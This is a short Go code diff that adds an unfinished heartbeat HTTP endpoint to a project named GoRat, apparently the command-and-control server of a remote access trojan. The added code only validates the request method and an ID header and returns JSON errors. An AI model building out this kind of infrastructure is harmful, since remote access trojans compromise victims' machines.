@@ -3,6 +3,7 @@ package endpoints
 import (
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"net/http"
 
 	"github.com/NotKatsu/GoRat/database"
@@ -110,4 +111,50 @@ func ConnectionNew(w http.ResponseWriter, r *http.Request) {
 }
 
 func ConnectionHeartbeat(w http.ResponseWriter, r *http.Request) {
+	if r.Method == "POST" {
+		ID := r.Header.Get("ID")
+
+		if ID == "" {
+			NewUnauthorizedError := Error{
+				ErrorCode:    http.StatusUnauthorized,
+				ErrorMessage: "Content is missing from request headers.",
+			}
+
+			w.WriteHeader(http.StatusUnauthorized)
+
+			NewReturnUnauthorizedError, err := json.Marshal(NewUnauthorizedError)
+
+			if err != nil {
+				pterm.Fatal.WithFatal(true).Println(err)
+			} else {
+				_, err := w.Write(NewReturnUnauthorizedError)
+
+				if err != nil {
+					pterm.Fatal.WithFatal(true).Println(err)
+				}
+			}
+		} else {
+			fmt.Println("Everything here that is needed.")
+		}
+
+	} else {
+		NewMethodError := Error{
+			ErrorCode:    http.StatusMethodNotAllowed,
+			ErrorMessage: "POST is the only accepted Method for this endpoint.",
+		}
+
+		w.WriteHeader(http.StatusMethodNotAllowed)
+
+		NewReturnMethodError, err := json.Marshal(NewMethodError)
+
+		if err != nil {
+			pterm.Fatal.WithFatal(true).Println(err)
+		} else {
+			_, err := w.Write(NewReturnMethodError)
+
+			if err != nil {
+				pterm.Fatal.WithFatal(true).Println(err)
+			}
+		}
+	}
 }
